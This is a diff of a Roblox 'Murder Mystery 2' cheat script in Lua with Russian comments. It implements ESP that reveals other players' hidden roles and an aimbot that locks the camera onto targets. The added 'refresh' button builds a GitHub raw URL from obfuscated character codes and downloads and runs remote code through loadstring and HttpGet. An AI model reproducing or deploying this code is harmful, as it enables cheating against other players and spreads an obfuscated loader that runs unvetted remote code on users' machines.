@@ -1,315 +1,289 @@
--- MM2 SCRIPT V2
--- TGK: @VNMA_OFFICIAL
+PLAYER = game.Players.LocalPlayer
+MOUSE = PLAYER:GetMouse()
+CC = game.Workspace.CurrentCamera
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Mouse = LocalPlayer:GetMouse()
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
+_G.SHOW_MURDERER = true
+_G.SHOW_SHERIFF = true
+_G.SHOW_INNOCENTS = true
+_G.AIM_ENABLED = true
 
--- Твои оригинальные переменные
-_G.ESP_Murder = false
-_G.ESP_Sheriff = false
-_G.ESP_Innocent = false
-_G.AimBot_Enabled = false
+AIM_LOCK = false
+local TARGET = nil
+_G.AIM_BIND = 'r'
 
-local r_ToggleActive = false
-local pkm_Pressed = false
-local lockedTarget = nil
+local PREDICTION_COEF = 0.185
+local AIM_SMOOTHNESS = 0.25
 
--- === ОРИГИНАЛЬНОЕ СОЗДАНИЕ ИНТЕРФЕЙСА ===
-local ScreenGui = Instance.new("ScreenGui")
-local MainFrame = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local ESP_Title = Instance.new("TextLabel")
-local Murder_Btn = Instance.new("TextButton")
-local Sheriff_Btn = Instance.new("TextButton")
-local Innocent_Btn = Instance.new("TextButton")
-local Line = Instance.new("Frame")
-local Aim_Title = Instance.new("TextLabel")
-local Aim_Btn = Instance.new("TextButton")
-local Hide_Btn = Instance.new("TextButton")
-local UICorner_Hide = Instance.new("UICorner")
-local TGLabel = Instance.new("TextLabel")
+if game.CoreGui:FindFirstChild("MM2_Menu") then
+    game.CoreGui.MM2_Menu:Destroy()
+end
 
-ScreenGui.Parent = (gethui and gethui()) or game.CoreGui
-ScreenGui.Name = "MM2_V2"
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "MM2_Menu"
+ScreenGui.ResetOnSpawn = false
 
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = ScreenGui
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 200, 0, 310)
+MainFrame.Position = UDim2.new(0, 30, 0.4, -155)
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-MainFrame.Position = UDim2.new(0.05, 0, 0.3, 0)
-MainFrame.Size = UDim2.new(0, 220, 0, 320)
+MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Draggable = true
 
-UICorner.Parent = MainFrame
-UICorner.CornerRadius = UDim.new(0, 8)
+local MainCorner = Instance.new("UICorner", MainFrame)
+MainCorner.CornerRadius = UDim.new(0, 6)
 
--- Твой ТГК на GUI
-TGLabel.Parent = MainFrame
-TGLabel.Size = UDim2.new(1, 0, 0, 20)
-TGLabel.Position = UDim2.new(0, 0, 1, -25)
-TGLabel.BackgroundTransparency = 1
-TGLabel.Text = "TG: @VNMA_OFFICIAL"
-TGLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-TGLabel.TextSize = 14
-TGLabel.Font = Enum.Font.SourceSansItalic
+local CloseBtn = Instance.new("TextButton", MainFrame)
+CloseBtn.Size = UDim2.new(0, 25, 0, 25)
+CloseBtn.Position = UDim2.new(1, -30, 0, 5)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Text = "✕"
+CloseBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+CloseBtn.Font = Enum.Font.SourceSansBold
+CloseBtn.FontSize = Enum.FontSize.Size18
 
-ESP_Title.Name = "ESP_Title"
-ESP_Title.Parent = MainFrame
-ESP_Title.BackgroundTransparency = 1
-ESP_Title.Position = UDim2.new(0, 15, 0, 15)
-ESP_Title.Size = UDim2.new(0, 150, 0, 25)
-ESP_Title.Font = Enum.Font.SourceSansBold
-ESP_Title.Text = "ESP"
-ESP_Title.TextColor3 = Color3.fromRGB(255, 185, 0)
-ESP_Title.TextSize = 22
-ESP_Title.TextXAlignment = Enum.TextXAlignment.Left
+local MiniFrame = Instance.new("TextButton", ScreenGui)
+MiniFrame.Size = UDim2.new(0, 45, 0, 45)
+MiniFrame.Position = UDim2.new(0, 30, 0.4, -22)
+MiniFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MiniFrame.BorderSizePixel = 0
+MiniFrame.Text = "GUI"
+MiniFrame.TextColor3 = Color3.fromRGB(255, 255, 255)
+MiniFrame.Font = Enum.Font.SourceSansBold
+MiniFrame.FontSize = Enum.FontSize.Size14
+MiniFrame.Visible = false
+MiniFrame.Active = true
+MiniFrame.Draggable = true
 
-Murder_Btn.Name = "Murder_Btn"
-Murder_Btn.Parent = MainFrame
-Murder_Btn.BackgroundTransparency = 1
-Murder_Btn.Position = UDim2.new(0, 15, 0, 45)
-Murder_Btn.Size = UDim2.new(0, 190, 0, 30)
-Murder_Btn.Font = Enum.Font.SourceSansBold
-Murder_Btn.Text = "Убийца- ❌"
-Murder_Btn.TextColor3 = Color3.fromRGB(255, 50, 50)
-Murder_Btn.TextSize = 18
-Murder_Btn.TextXAlignment = Enum.TextXAlignment.Left
+local MiniCorner = Instance.new("UICorner", MiniFrame)
+MiniCorner.CornerRadius = UDim.new(0, 6)
 
-Sheriff_Btn.Name = "Sheriff_Btn"
-Sheriff_Btn.Parent = MainFrame
-Sheriff_Btn.BackgroundTransparency = 1
-Sheriff_Btn.Position = UDim2.new(0, 15, 0, 75)
-Sheriff_Btn.Size = UDim2.new(0, 190, 0, 30)
-Sheriff_Btn.Font = Enum.Font.SourceSansBold
-Sheriff_Btn.Text = "Шериф- ❌"
-Sheriff_Btn.TextColor3 = Color3.fromRGB(50, 150, 255)
-Sheriff_Btn.TextSize = 18
-Sheriff_Btn.TextXAlignment = Enum.TextXAlignment.Left
-
-Innocent_Btn.Name = "Innocent_Btn"
-Innocent_Btn.Parent = MainFrame
-Innocent_Btn.BackgroundTransparency = 1
-Innocent_Btn.Position = UDim2.new(0, 15, 0, 105)
-Innocent_Btn.Size = UDim2.new(0, 190, 0, 30)
-Innocent_Btn.Font = Enum.Font.SourceSansBold
-Innocent_Btn.Text = "Невинный- ❌"
-Innocent_Btn.TextColor3 = Color3.fromRGB(150, 255, 150)
-Innocent_Btn.TextSize = 18
-Innocent_Btn.TextXAlignment = Enum.TextXAlignment.Left
-
-Line.Name = "Line"
-Line.Parent = MainFrame
-Line.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-Line.Position = UDim2.new(0, 15, 0, 145)
-Line.Size = UDim2.new(0, 190, 0, 2)
-Line.BorderSizePixel = 0
-
-Aim_Title.Name = "Aim_Title"
-Aim_Title.Parent = MainFrame
-Aim_Title.BackgroundTransparency = 1
-Aim_Title.Position = UDim2.new(0, 15, 0, 160)
-Aim_Title.Size = UDim2.new(0, 150, 0, 25)
-Aim_Title.Font = Enum.Font.SourceSansBold
-Aim_Title.Text = "AIM-BOT"
-Aim_Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Aim_Title.TextSize = 22
-Aim_Title.TextXAlignment = Enum.TextXAlignment.Left
-
-Aim_Btn.Name = "Aim_Btn"
-Aim_Btn.Parent = MainFrame
-Aim_Btn.BackgroundTransparency = 1
-Aim_Btn.Position = UDim2.new(0, 15, 0, 190)
-Aim_Btn.Size = UDim2.new(0, 190, 0, 30)
-Aim_Btn.Font = Enum.Font.SourceSansBold
-Aim_Btn.Text = "AIM- ❌"
-Aim_Btn.TextColor3 = Color3.fromRGB(255, 100, 100)
-Aim_Btn.TextSize = 18
-Aim_Btn.TextXAlignment = Enum.TextXAlignment.Left
-
--- Кнопка скрытия "gyi"
-Hide_Btn.Name = "Hide_Btn"
-Hide_Btn.Parent = ScreenGui
-Hide_Btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Hide_Btn.Position = UDim2.new(0.05, 0, 0.3, 0)
-Hide_Btn.Size = UDim2.new(0, 40, 0, 40)
-Hide_Btn.Font = Enum.Font.SourceSansBold
-Hide_Btn.Text = "gyi"
-Hide_Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-Hide_Btn.TextSize = 14
-Hide_Btn.Visible = false
-
-UICorner_Hide.Parent = Hide_Btn
-UICorner_Hide.CornerRadius = UDim.new(0, 6)
-
-local guiHidden = false
-local function toggleGuiVisual()
-    guiHidden = not guiHidden
-    if guiHidden then
-        MainFrame.Visible = false
-        Hide_Btn.Position = MainFrame.Position
-        Hide_Btn.Visible = true
-    else
-        MainFrame.Visible = true
-        Hide_Btn.Visible = false
-    end
-end
-Hide_Btn.MouseButton1Click:Connect(toggleGuiVisual)
-
--- Переключение состояний кнопок
-Murder_Btn.MouseButton1Click:Connect(function()
-    _G.ESP_Murder = not _G.ESP_Murder
-    Murder_Btn.Text = _G.ESP_Murder and "Убийца- ✅" or "Убийца- ❌"
+CloseBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = false
+    MiniFrame.Position = UDim2.new(0, MainFrame.AbsolutePosition.X, 0, MainFrame.AbsolutePosition.Y)
+    MiniFrame.Visible = true
 end)
 
-Sheriff_Btn.MouseButton1Click:Connect(function()
-    _G.ESP_Sheriff = not _G.ESP_Sheriff
-    Sheriff_Btn.Text = _G.ESP_Sheriff and "Шериф- ✅" or "Шериф- ❌"
+MiniFrame.MouseButton1Click:Connect(function()
+    MiniFrame.Visible = false
+    MainFrame.Position = UDim2.new(0, MiniFrame.AbsolutePosition.X, 0, MiniFrame.AbsolutePosition.Y)
+    MainFrame.Visible = true
 end)
 
-Innocent_Btn.MouseButton1Click:Connect(function()
-    _G.ESP_Innocent = not _G.ESP_Innocent
-    Innocent_Btn.Text = _G.ESP_Innocent and "Невинный- ✅" or "Невинный- ❌"
-end)
+local EspTitle = Instance.new("TextLabel", MainFrame)
+EspTitle.Size = UDim2.new(1, 0, 0, 30)
+EspTitle.Position = UDim2.new(0, 15, 0, 10)
+EspTitle.BackgroundTransparency = 1
+EspTitle.Text = "ESP"
+EspTitle.TextColor3 = Color3.fromRGB(255, 180, 0)
+EspTitle.Font = Enum.Font.SourceSansBold
+EspTitle.FontSize = Enum.FontSize.Size18
+EspTitle.TextXAlignment = Enum.TextXAlignment.Left
 
-Aim_Btn.MouseButton1Click:Connect(function()
-    _G.AimBot_Enabled = not _G.AimBot_Enabled
-    Aim_Btn.Text = _G.AimBot_Enabled and "AIM- ✅" or "AIM- ❌"
-    if not _G.AimBot_Enabled then
-        r_ToggleActive = false
-        lockedTarget = nil
-    end
-end)
-
-
--- === ЛОГИКА ESP ИЗ ТВОЕЙ ССЫЛКИ ===
-local function createESP(player, color, roleName)
-    if player.Character and not player.Character:FindFirstChild("MM2_ESP") then
-        local highlight = Instance.new("Highlight")
-        highlight.Name = "MM2_ESP"
-        highlight.Parent = player.Character
-        highlight.FillColor = color
-        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
-        highlight.FillTransparency = 0.5
-        highlight.OutlineTransparency = 0
-        
-        local billboard = Instance.new("BillboardGui")
-        billboard.Name = "MM2_Name"
-        billboard.Parent = player.Character
-        billboard.Adornee = player.Character:FindFirstChild("Head")
-        billboard.Size = UDim2.new(0, 100, 0, 150)
-        billboard.StudsOffset = Vector3.new(0, 3, 0)
-        billboard.AlwaysOnTop = true
-        
-        local textLabel = Instance.new("TextLabel")
-        textLabel.Parent = billboard
-        textLabel.BackgroundTransparency = 1
-        textLabel.Size = UDim2.new(1, 0, 1, 0)
-        textLabel.Text = player.Name .. " [" .. roleName .. "]"
-        textLabel.TextColor3 = color
-        textLabel.TextSize = 14
-        textLabel.Font = Enum.Font.SourceSansBold
-    end
-end
-
-local function removeESP(player)
-    if player.Character then
-        local hl = player.Character:FindFirstChild("MM2_ESP")
-        local bb = player.Character:FindFirstChild("MM2_Name")
-        if hl then hl:Destroy() end
-        if bb then bb:Destroy() end
-    end
-end
-
-task.spawn(function()
-    while true do
-        task.wait(0.5)
-        for _, p in pairs(Players:GetPlayers()) do
-            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                local backpack = p:FindFirstChild("Backpack")
-                local character = p.Character
-                
-                local isMurder = (backpack and backpack:FindFirstChild("Knife")) or character:FindFirstChild("Knife")
-                local isSheriff = (backpack and backpack:FindFirstChild("Gun")) or character:FindFirstChild("Gun")
-                
-                if isMurder and _G.ESP_Murder then
-                    createESP(p, Color3.fromRGB(255, 50, 50), "Murder")
-                elseif isSheriff and _G.ESP_Sheriff then
-                    createESP(p, Color3.fromRGB(50, 150, 255), "Sheriff")
-                elseif not isMurder and not isSheriff and _G.ESP_Innocent then
-                    createESP(p, Color3.fromRGB(150, 255, 150), "Innocent")
-                else
-                    removeESP(p)
-                end
-            end
-        end
-    end
-end)
-
-
--- === СВЕРХБЫСТРЫЙ АИМ-БОТ ИЗ ВАРИАНТА 1 ===
-local function getClosestPlayerToCursor()
-    local closestPlayer = nil
-    local shortestDistance = math.huge
-    for _, player in pairs(Players:GetPlayers()) do
-        -- Моментальный поиск БЕЗ задержек на проверку ролей
-        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
-            local pos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
-            if onScreen then
-                local distance = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(pos.X, pos.Y)).Magnitude
-                if distance < shortestDistance then
-                    closestPlayer = player
-                    shortestDistance = distance
-                end
-            end
-        end
-    end
-    return closestPlayer
-end
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
+local function CreateToggle(text, pos, state_var, color)
+    local LabelBtn = Instance.new("TextButton", MainFrame)
+    LabelBtn.Size = UDim2.new(1, -30, 0, 25)
+    LabelBtn.Position = pos
+    LabelBtn.BackgroundTransparency = 1
+    LabelBtn.Font = Enum.Font.SourceSansBold
+    LabelBtn.FontSize = Enum.FontSize.Size18
+    LabelBtn.TextXAlignment = Enum.TextXAlignment.Left
     
-    if input.KeyCode == Enum.KeyCode.R and _G.AimBot_Enabled then
-        r_ToggleActive = not r_ToggleActive
-        if not r_ToggleActive then
-            lockedTarget = nil
+    local function refresh()
+        if _G[state_var] then
+            LabelBtn.Text = text .. " - ✅"
+            LabelBtn.TextColor3 = color
+        else
+            LabelBtn.Text = text .. " - ❌"
+            LabelBtn.TextColor3 = Color3.fromRGB(120, 120, 120)
         end
     end
     
-    if input.UserInputType == Enum.UserInputType.MouseButton2 and r_ToggleActive and _G.AimBot_Enabled then
-        pkm_Pressed = true
-                    lockedTarget = getClosestPlayerToCursor()
-    end
-end)
+    refresh()
+    LabelBtn.MouseButton1Click:Connect(function()
+        _G[state_var] = not _G[state_var]
+        refresh()
+    end)
+end
 
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton2 then
-        pkm_Pressed = false
-        lockedTarget = nil
-    end
-end)
+CreateToggle("Убийца", UDim2.new(0, 15, 0, 45), "SHOW_MURDERER", Color3.fromRGB(255, 50, 50))
+CreateToggle("Шериф", UDim2.new(0, 15, 0, 75), "SHOW_SHERIFF", Color3.fromRGB(50, 150, 255))
+CreateToggle("Невинный", UDim2.new(0, 15, 0, 105), "SHOW_INNOCENTS", Color3.fromRGB(50, 255, 50))
 
-RunService.RenderStepped:Connect(function()
-    if not _G.AimBot_Enabled or not r_ToggleActive or not pkm_Pressed or not lockedTarget then return end
+local Line = Instance.new("TextLabel", MainFrame)
+Line.Size = UDim2.new(1, -30, 0, 15)
+Line.Position = UDim2.new(0, 15, 0, 140)
+Line.BackgroundTransparency = 1
+Line.Text = "------------------------"
+Line.TextColor3 = Color3.fromRGB(255, 50, 50)
+Line.Font = Enum.Font.SourceSansBold
+Line.FontSize = Enum.FontSize.Size14
+
+local AimTitle = Instance.new("TextLabel", MainFrame)
+AimTitle.Size = UDim2.new(1, 0, 0, 30)
+AimTitle.Position = UDim2.new(0, 15, 0, 165)
+AimTitle.BackgroundTransparency = 1
+AimTitle.Text = "AIM-BOT"
+AimTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+AimTitle.Font = Enum.Font.SourceSansBold
+AimTitle.FontSize = Enum.FontSize.Size18
+AimTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+CreateToggle("AIM [".._G.AIM_BIND:upper().."]", UDim2.new(0, 15, 0, 200), "AIM_ENABLED", Color3.fromRGB(255, 80, 80))
+
+local RefreshBtn = Instance.new("TextButton", MainFrame)
+RefreshBtn.Size = UDim2.new(1, -30, 0, 35)
+RefreshBtn.Position = UDim2.new(0, 15, 1, -45)
+RefreshBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+RefreshBtn.Text = "ОБНОВИТЬ СКРИПТ 🔄"
+RefreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+RefreshBtn.Font = Enum.Font.SourceSansBold
+RefreshBtn.FontSize = Enum.FontSize.Size14
+RefreshBtn.BorderSizePixel = 0
+
+local RefCorner = Instance.new("UICorner", RefreshBtn)
+RefCorner.CornerRadius = UDim.new(0, 4)
+
+RefreshBtn.MouseButton1Click:Connect(function()
+    for _, v in pairs(game.Players:GetPlayers()) do
+        if v.Character then
+            if v.Character:FindFirstChild('ESP_Highlight') then v.Character.ESP_Highlight:Destroy() end
+            if v.Character:FindFirstChild('Head') and v.Character.Head:FindFirstChild('ESP_Tag') then v.Character.Head.ESP_Tag:Destroy() end
+        end
+    end
+    ScreenGui:Destroy()
+    local H = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47)
+    loadstring(game:HttpGet(H .. "s46173875-eng/rb/main/mm2.lua"))()
+end)
+local function GetRole(player)
+    if not player or not player:FindFirstChild("Backpack") or not player.Character then return "Innocent" end
+    if player.Backpack:FindFirstChild("Knife") or player.Character:FindFirstChild("Knife") then return "Murderer" end
+    if player.Backpack:FindFirstChild("Gun") or player.Character:FindFirstChild("Gun") then return "Sheriff" end
+    return "Innocent"
+end
+
+function GetClosestPlayer()
+ if not _G.AIM_ENABLED then return nil end
+ local closest = nil
+ local shortestDist = math.huge
+ for _, v in pairs(game.Players:GetPlayers()) do
+  if v ~= PLAYER and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+   local pos, onScreen = CC:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
+   if onScreen then
+    local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(MOUSE.X, MOUSE.Y)).Magnitude
+    if dist < shortestDist then
+     shortestDist = dist
+     closest = v
+    end
+   end
+  end
+ end
+ return closest
+end
+
+function UPDATE_ESP(CHARACTER, PLAYER_OBJ)
+ if not CHARACTER or not PLAYER_OBJ then return end
+ local role = GetRole(PLAYER_OBJ)
+ 
+ local shouldShow = false
+ if role == "Murderer" and _G.SHOW_MURDERER then shouldShow = true
+ elseif role == "Sheriff" and _G.SHOW_SHERIFF then shouldShow = true
+ elseif role == "Innocent" and _G.SHOW_INNOCENTS then shouldShow = true end
+
+ if not shouldShow then
+  if CHARACTER:FindFirstChild('ESP_Highlight') then CHARACTER.ESP_Highlight:Destroy() end
+  if CHARACTER:FindFirstChild('Head') and CHARACTER.Head:FindFirstChild('ESP_Tag') then CHARACTER.Head.ESP_Tag:Destroy() end
+  return
+ end
+
+ if not CHARACTER:FindFirstChild('ESP_Highlight') then
+  local Highlight = Instance.new('Highlight', CHARACTER)
+  Highlight.Name = 'ESP_Highlight'
+  Highlight.FillTransparency = 0.6
+  Highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+  Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+ end
+
+ local Head = CHARACTER:FindFirstChild('Head')
+ if Head and not Head:FindFirstChild('ESP_Tag') then
+  local BillboardGui = Instance.new('BillboardGui', Head)
+  BillboardGui.Name = 'ESP_Tag'
+  BillboardGui.AlwaysOnTop = true
+  BillboardGui.Size = UDim2.new(0, 200, 0, 20)
+  BillboardGui.ExtentsOffset = Vector3.new(0, 2.5, 0)
+  
+  local TextLabel = Instance.new('TextLabel', BillboardGui)
+  TextLabel.BackgroundTransparency = 1
+  TextLabel.Size = UDim2.new(1, 0, 1, 0)
+  TextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+  TextLabel.TextStrokeTransparency = 0
+  TextLabel.FontSize = Enum.FontSize.Size10
+  TextLabel.Font = Enum.Font.SourceSansBold
+ end
+
+ local highlight = CHARACTER:FindFirstChild('ESP_Highlight')
+ local tag = Head and Head:FindFirstChild('ESP_Tag')
+ local textLabel = tag and tag:FindFirstChildOfClass("TextLabel")
+ 
+ if highlight and textLabel then
+     if role == "Murderer" then
+         highlight.FillColor = Color3.fromRGB(255, 0, 0)
+         textLabel.Text = PLAYER_OBJ.Name:upper() .. " [УБИЙЦА 🔪]"
+         textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+     elseif role == "Sheriff" then
+         highlight.FillColor = Color3.fromRGB(0, 0, 255)
+         textLabel.Text = PLAYER_OBJ.Name:upper() .. " [ШЕРИФ ︻╦╤─]"
+         textLabel.TextColor3 = Color3.fromRGB(0, 150, 255)
+     else
+         highlight.FillColor = Color3.fromRGB(0, 255, 0)
+         textLabel.Text = PLAYER_OBJ.Name:upper() .. " [МИРНЫЙ 👤]"
+         textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+     end
+ end
+end
+
+local AIM_READY = false 
+
+game:GetService('UserInputService').InputBegan:Connect(function(i, g)
+    if g then return end
     
-    local char = lockedTarget.Character
-    if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 then
-        local targetHRP = char.HumanoidRootPart
-        
-        -- Быстрый расчёт упреждения пистолета
-        local distance = (targetHRP.Position - Camera.CFrame.Position).Magnitude
-        local bulletSpeed = 230
-        local timeToTarget = distance / bulletSpeed
-        
-        local bulletPredictionOffset = targetHRP.Velocity * timeToTarget
-        local aimPosition = targetHRP.Position + bulletPredictionOffset
-        
-        Camera.CFrame = CFrame.new(Camera.CFrame.Position, aimPosition)
-    else
-        lockedTarget = getClosestPlayerToCursor()
+    -- Кнопка R: Включает или выключает готовность аима
+    if i.KeyCode == Enum.KeyCode.R then
+        AIM_READY = not AIM_READY
+        if not AIM_READY then
+            AIM_LOCK = false
+            TARGET = nil
+        end
     end
+    
+    -- Правая кнопка мыши: Захватывает ближайшего игрока, если активирован режим R
+    if i.UserInputType == Enum.UserInputType.MouseButton2 and AIM_READY then
+        AIM_LOCK = true
+        TARGET = GetClosestPlayer()
+    end
+end)
+
+game:GetService('UserInputService').InputEnded:Connect(function(i, g)
+    if g then return end
+    
+    -- Отпускание правой кнопки мыши: Сбрасывает прицеливание
+    if i.UserInputType == Enum.UserInputType.MouseButton2 then
+        AIM_LOCK = false
+        TARGET = nil
+    end
+end)
+
+game:GetService('RunService').RenderStepped:Connect(function()
+  for _, v in pairs(game.Players:GetPlayers()) do
+   if v ~= PLAYER and v.Character and v.Character:FindFirstChild('Head') then
+     UPDATE_ESP(v.Character, v)
+    end
+  end
+ 
+ if AIM_LOCK and TARGET and TARGET.Character and TARGET.Character:FindFirstChild("HumanoidRootPart") then
+  local root = TARGET.Character.HumanoidRootPart
+  local predictedPosition = root.Position + (root.Velocity * PREDICTION_COEF)
+  local targetCFrame = CFrame.new(CC.CoordinateFrame.p, predictedPosition)
+  CC.CoordinateFrame = CC.CoordinateFrame:Lerp(targetCFrame, AIM_SMOOTHNESS)
+ end
 end)
